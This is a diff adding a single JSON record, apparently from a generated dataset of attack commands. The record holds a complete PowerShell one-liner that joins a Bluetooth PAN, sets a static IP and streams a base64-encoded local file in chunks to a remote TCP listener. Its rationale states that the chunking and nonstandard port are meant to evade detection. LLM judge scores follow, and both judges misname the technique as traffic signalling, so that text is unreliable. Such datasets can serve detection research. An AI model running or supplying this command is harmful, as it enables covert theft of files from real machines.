@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.203.77.2 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\clip.mp4')); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.203.77.2'),0)); $cli.Connect('10.203.77.1',53421); $st=$cli.GetStream(); for($i=0;$i -lt $payload.Length;$i+=2048){ $ch=$payload.Substring($i,[Math]::Min(2048,$payload.Length-$i)); $bb=[Text.Encoding]::UTF8.GetBytes($ch); $st.Write($bb,0,$bb.Length) }; $st.Close(); $cli.Close()",
+  "explanation": "Leverages Bluetooth PAN with a static IP and streams base64 in small chunks over a high TCP port to reduce anomalies on the alternate medium (T1011).",
+  "rationale_steps": [
+    "Establish Bluetooth NAP connectivity.",
+    "Configure Bluetooth interface with a /30 to isolate routing.",
+    "Bind TCP client to Bluetooth IP to ensure exfil over Bluetooth.",
+    "Chunk base64 payload and transmit over a nonstandard port to evade simple detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-1ad2f656",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell chain is well-formed with balanced quotes/braces, proper separators, and parseable pipelines and method calls.",
+        "semantic_score": 3,
+        "semantic_justification": "While it plausibly attempts PAN setup and chunked TCP exfiltration, it likely uses the wrong Bluetooth tool for PAN connection, requires admin rights for the netsh IP change, and the direct TCP/base64 stream does not truly implement traffic signaling as described.",
+        "combined_score": 4.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-01T17:25:58.234329Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed PowerShell, using correct syntax for external commands, cmdlets, variable assignments, .NET object instantiation, method calls, and loop constructs.",
+        "semantic_score": 3,
+        "semantic_justification": "While the conceptual design perfectly aligns with T1011 (Traffic Signaling) by leveraging Bluetooth PAN, static IPs, and chunked base64 over high TCP ports, the command's operational plausibility is significantly reduced by the 'netsh interface ip set address' command requiring Administrator privileges, contradicting the stated 'Privilege: None' constraint.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T17:26:29.209711Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
